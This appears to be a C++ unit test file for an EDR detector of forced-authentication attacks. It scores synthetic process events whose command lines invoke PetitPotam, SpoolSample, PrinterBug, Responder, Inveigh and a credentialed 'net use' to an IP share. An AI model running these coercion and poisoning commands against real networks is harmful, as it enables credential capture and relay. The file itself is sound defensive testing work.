/*
 * forced_auth_detector_tests.cpp - Unit tests for ForcedAuthDetector
 * (T1187).
 */
#include "forced_auth_detector_tests.h"

#include <cstdint>
#include <cstdio>
#include <stdexcept>
#include <string>

#include "edr_event.h"
#include "event_bus.h"
#include "forced_auth_detector.h"

namespace {

#define AUTH_CHECK(condition) Check((condition), #condition, __LINE__)

void Check(bool condition, const char* expression, int line) {
    if (!condition)
        throw std::runtime_error(
            "forced auth detector test failed at line " +
            std::to_string(line) + ": " + expression);
}

edr::Event ProcEvent(uint64_t ts100ns, const char* image,
                     const char* command) {
    edr::Event event;
    event.type = EDR_EVT_PROCESS_START;
    event.ts100ns = ts100ns;
    event.fields[edr::field::kType] = "PROCESS_START";
    event.fields[edr::field::kImage] = image;
    if (command != nullptr) {
        event.fields[edr::field::kCommandLine] = command;
    }
    return event;
}

bool HasScore(const edr::Event& event) {
    return event.fields.find(edr::field::kForcedAuthScore) !=
           event.fields.end();
}

constexpr uint64_t kSecond = 10000000ULL;

} // namespace

void RunForcedAuthDetectorTests() {
    std::fprintf(stderr, "[forced-auth] TestDisabled\n");
    {
        edr::ForcedAuthDetector detector(false, 55, 300, 1024);
        edr::Event event = ProcEvent(
            1000 * kSecond, "python.exe",
            "python3 petitpotam.py attacker 10.0.0.5");
        detector.Enrich(event);
        AUTH_CHECK(!HasScore(event));
    }
    std::fprintf(stderr, "[forced-auth] TestPetitpotam\n");
    {
        /* petitpotam -> 90 malicious. */
        edr::ForcedAuthDetector detector(true, 55, 300, 1024);
        edr::Event event = ProcEvent(
            1000 * kSecond, "python.exe",
            "python3 petitpotam.py attacker 10.0.0.5");
        detector.Enrich(event);
        AUTH_CHECK(HasScore(event));
        AUTH_CHECK(event.fields.at(edr::field::kForcedAuthScore) == "90");
        AUTH_CHECK(event.fields.at(edr::field::kForcedAuthVerdict) ==
                   "MALICIOUS");
        AUTH_CHECK(event.fields.at(edr::field::kForcedAuthSignals) ==
                   "petitpotam");
        AUTH_CHECK(event.fields.at(edr::field::kForcedAuthTargets) ==
                   "petitpotam");
    }
    std::fprintf(stderr, "[forced-auth] TestSpoolsample\n");
    {
        /* spoolsample -> 90 malicious. */
        edr::ForcedAuthDetector detector(true, 55, 300, 1024);
        edr::Event event = ProcEvent(
            1000 * kSecond, "SpoolSample.exe",
            "SpoolSample.exe 10.0.0.5 attacker");
        detector.Enrich(event);
        AUTH_CHECK(event.fields.at(edr::field::kForcedAuthScore) == "90");
        AUTH_CHECK(event.fields.at(edr::field::kForcedAuthSignals) ==
                   "spoolsample");
    }
    std::fprintf(stderr, "[forced-auth] TestPrinterBug\n");
    {
        /* printerbug -> 90 malicious. */
        edr::ForcedAuthDetector detector(true, 55, 300, 1024);
        edr::Event event = ProcEvent(
            1000 * kSecond, "python.exe",
            "python printerbug.py 10.0.0.5 10.0.0.5");
        detector.Enrich(event);
        AUTH_CHECK(event.fields.at(edr::field::kForcedAuthScore) == "90");
        AUTH_CHECK(event.fields.at(edr::field::kForcedAuthSignals) ==
                   "printerbug");
    }
    std::fprintf(stderr, "[forced-auth] TestResponder\n");
    {
        /* responder with an interface -> 85 malicious. */
        edr::ForcedAuthDetector detector(true, 55, 300, 1024);
        edr::Event event = ProcEvent(
            1000 * kSecond, "responder", "responder -I eth0 -wv");
        detector.Enrich(event);
        AUTH_CHECK(event.fields.at(edr::field::kForcedAuthScore) == "85");
        AUTH_CHECK(event.fields.at(edr::field::kForcedAuthSignals) ==
                   "responder");
    }
    std::fprintf(stderr, "[forced-auth] TestInveigh\n");
    {
        /* inveigh -> 85 malicious. */
        edr::ForcedAuthDetector detector(true, 55, 300, 1024);
        edr::Event event = ProcEvent(
            1000 * kSecond, "Inveigh.exe", "Inveigh.exe -SMB Y -HTTP N");
        detector.Enrich(event);
        AUTH_CHECK(event.fields.at(edr::field::kForcedAuthScore) == "85");
        AUTH_CHECK(event.fields.at(edr::field::kForcedAuthSignals) ==
                   "inveigh");
    }
    std::fprintf(stderr, "[forced-auth] TestUncCoercion\n");
    {
        /* net use to an IPv4 UNC target -> 55 suspicious. */
        edr::ForcedAuthDetector detector(true, 55, 300, 1024);
        edr::Event event = ProcEvent(
            1000 * kSecond, "cmd.exe",
            "net use \\\\10.0.0.5\\share /user:admin pass");
        detector.Enrich(event);
        AUTH_CHECK(event.fields.at(edr::field::kForcedAuthScore) == "55");
        AUTH_CHECK(event.fields.at(edr::field::kForcedAuthVerdict) ==
                   "SUSPICIOUS");
        AUTH_CHECK(event.fields.at(edr::field::kForcedAuthSignals) ==
                   "unc_credential_coercion");
    }
    std::fprintf(stderr, "[forced-auth] TestBenignSilent\n");
    {
        edr::ForcedAuthDetector detector(true, 55, 300, 1024);
        /* Hostname UNC target is not a coercion signature. */
        edr::Event hostname = ProcEvent(
            1000 * kSecond, "cmd.exe",
            "net use \\\\fileserver\\share /user:admin pass");
        detector.Enrich(hostname);
        AUTH_CHECK(!HasScore(hostname));

        /* responder without an interface argument is out of scope. */
        edr::Event responder = ProcEvent(
            1001 * kSecond, "responder", "responder -wv");
        detector.Enrich(responder);
        AUTH_CHECK(!HasScore(responder));

        edr::Event notepad = ProcEvent(
            1002 * kSecond, "notepad.exe", "notepad notes.txt");
        detector.Enrich(notepad);
        AUTH_CHECK(!HasScore(notepad));
    }
    std::fprintf(stderr, "[forced-auth] TestDedupWindow\n");
    {
        edr::ForcedAuthDetector detector(true, 55, 300, 1024);
        edr::Event first = ProcEvent(
            1000 * kSecond, "python.exe",
            "python3 petitpotam.py attacker 10.0.0.5");
        detector.Enrich(first);
        AUTH_CHECK(HasScore(first));
        edr::Event repeat = ProcEvent(
            1010 * kSecond, "python.exe",
            "python3 petitpotam.py attacker 10.0.0.5");
        detector.Enrich(repeat);
        AUTH_CHECK(!HasScore(repeat));
        edr::Event expired = ProcEvent(
            1000 * kSecond + 301 * kSecond, "python.exe",
            "python3 petitpotam.py attacker 10.0.0.5");
        detector.Enrich(expired);
        AUTH_CHECK(HasScore(expired));
    }
    std::fprintf(stderr, "[forced-auth] TestInspects\n");
    {
        AUTH_CHECK(edr::ForcedAuthDetector::Inspects(EDR_EVT_PROCESS_START));
        AUTH_CHECK(!edr::ForcedAuthDetector::Inspects(EDR_EVT_REG_WRITE));
        AUTH_CHECK(!edr::ForcedAuthDetector::Inspects(EDR_EVT_FILE_CREATE));
    }
    std::fprintf(stderr, "[forced-auth] all passed\n");
}
